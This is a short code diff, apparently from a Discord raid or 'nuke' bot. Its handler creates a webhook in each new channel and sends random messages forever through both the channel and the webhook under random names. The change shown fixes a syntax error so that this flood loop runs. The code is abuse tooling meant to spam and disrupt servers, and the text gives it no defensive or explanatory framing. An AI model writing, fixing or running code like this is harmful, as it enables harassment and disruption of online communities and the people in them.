@@ -149,7 +149,7 @@ async def wizz(ctx, amount=20):
 async def on_guild_channel_create(channel):
   webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))
   while True:  
-    await channel.send(random.choice(MESSAGE_CONTENTS)
+    await channel.send(random.choice(MESSAGE_CONTENTS))
     await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))
 
 
